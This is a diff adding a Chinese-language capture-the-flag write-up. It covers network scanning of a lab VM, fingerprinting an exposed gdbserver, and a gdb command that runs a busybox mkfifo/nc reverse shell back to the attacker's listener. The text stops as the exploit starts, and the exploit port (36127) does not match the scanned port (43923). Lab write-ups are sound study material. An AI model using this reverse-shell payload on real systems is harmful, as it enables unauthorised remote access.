@@ -1,5 +1,173 @@
-<!-- ##{"script":"<script src='https://7r1umphk.github.io/plugins/jiami.js'></script>"}## -->
-<!--encrypt: 04cff78d-->
-<!--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-->
-<!--/encrypt-->
-遇到问题先自己解决。
+# 信息收集
+
+老规矩，先找出靶机 IP，然后挂后台扫端口。
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l   
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
+192.168.205.144 08:00:27:7d:b0:f7       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:ef:a8:26       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.978 seconds (129.42 hosts/sec). 4 responded
+                                                                                                                                                                                
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p 0-65535 192.168.205.144
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 00:52 -0500
+Nmap scan report for 192.168.205.144
+Host is up (0.00098s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+43923/tcp open  unknown
+MAC Address: 08:00:27:7D:B0:F7 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.69 seconds
+```
+
+扫出来 22、80，还有一个 43923 端口 nmap 识别不出服务。
+
+这里我走了很长一段弯路。Web 端去看了，有 info.php 和一个纯假 shell 的 eval.php。主页 index.php 虽然可以通过 action 和 file 参数结合 `/proc/self/root/` 跳回根目录读文件，但没有可以推进进展的东西。同时 43923 这个端口非常脆弱，大量发包扫描会直接把它扫死，当时在这里卡了很久，最后确定突破口只能在这个高危端口上。
+
+# 探测 GDBServer
+
+如果实在不知道 43923 是什么服务，有个耍赖皮的办法：直接看虚拟机的启动屏幕。
+
+![image-20260304135734174](http://7r1UMPHK.github.io/image/20260304211639358.webp)
+
+启动项里明明白白写着起了个 gdbserver。
+
+如果不依赖这种“物理外挂”，正经的探测方式是向端口发送特定的 GDB 握手包。
+
+```bash
+┌──(kali㉿kali)-[/tmp]
+└─$ printf '$qSupported#37' | timeout 2 nc 192.168.205.144 43923
++$PacketSize=2001f;QPassSignals+;QProgramSignals+;QStartupWithShell+;QEnvironmentHexEncoded+;QEnvironmentReset+;QEnvironmentUnset+;QSetWorkingDir+;QCatchSyscalls+;qXfer:libraries-svr4:read+;augmented-libraries-svr4-read+;qXfer:auxv:read+;qXfer:siginfo:read+;qXfer:siginfo:write+;qXfer:features:read+;QStartNoAckMode+;qXfer:osdata:read+;multiprocess+;fork-events+;vfork-events+;exec-events+;QNonStop+;QDisableRandomization+;qXfer:threads:read+;ConditionalTracepoints+;TraceStateVariables+;TracepointSource+;DisconnectedTracing+;StaticTracepoints+;InstallInTrace+;qXfer:statictrace:read+;qXfer:traceframe-info:read+;EnableDisableTracepoints+;QTBuffer:size+;tracenz+;ConditionalBreakpoints+;BreakpointCommands+;QAgent+;Qbtrace:bts+;Qbtrace-conf:bts:size+;Qbtrace:pt+;Qbtrace-conf:pt:size+;Qbtrace:off+;qXfer:btrace:read+;qXfer:btrace-conf:read+;swbreak+;hwbreak+;qXfer:exec-file:read+;vContSupported+;QThreadOptions=3;QThreadEvents+;no-resumed+#fa
+```
+
+看到返回内容里带了 `PacketSize`、`qXfer` 这些特有的字段，就能确诊这是 gdb remote 协议了。
+
+# 漏洞利用与初始据点
+
+gdbserver 暴露在公网可以直接弹 shell，这也是常规套路了。不过根据这个靶机的体积判断，底层大概率是 Alpine Linux，这意味着系统里没有 bash，只能指望 sh 或者 ash，并且可能有 busybox。
+因为这个端口极其不稳定，死了还得重启虚拟机巨麻烦，所以 payload 必须尽量一发入魂。
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+```
+
+起个监听。
+
+```bash
+┌──(kali㉿kali)-[/tmp]
+└─$ cat a.sh 
+IP=192.168.205.144;LHOST=192.168.205.128;LPORT=8888
+gdb -q -nx -ex "set pagination off" -ex "set confirm off" -ex "target extended-remote $IP:36127" -ex "set remote exec-file /bin/busybox" -ex "set args sh -c 'rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|/bin/busybox nc $LHOST $LPORT >/tmp/p'" -ex "run" -ex "quit"
+                                                                                                                                                                                
+┌──(kali㉿kali)-[/tmp]
+└─$ bash a.sh 
+Remote debugging using 192.168.205.144:36127
